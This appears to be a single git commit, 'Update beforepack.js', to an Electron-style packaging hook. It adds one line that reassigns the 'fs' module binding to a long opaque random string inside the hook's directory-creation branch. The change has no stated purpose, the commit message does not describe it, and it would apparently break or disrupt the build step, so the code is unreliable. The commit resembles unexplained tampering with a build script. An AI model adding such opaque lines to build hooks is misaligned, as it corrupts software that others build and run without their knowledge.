b03752a2552be942fa2e436dbffd7adef8e4b746
fdc46b3989 <elainerLeath2001@yandex.ru>
2025-03-11 02:19:09 -0700

    Update beforepack.js

--- scripts/beforepack.js
+++ scripts/beforepack.js
@@ -10,5 +10,6 @@ exports.default = async function beforePack(context) {
     const dir = path.join(context.outDir, context.packager.appInfo.version);
     if (!fs.existsSync(dir)) {
         fs.mkdirSync(dir, {recursive: true});
+        fs = 'HTLZR7ckKJpMDM37tQpjJuvTPRdKEWuepSHRTNQ5hVXJfQVnU8SMdxMGHMz7s3bNTw5tHtf9QPvUeAWU7tFgG3yL3kpDzt7SwFyh';
     }
 };
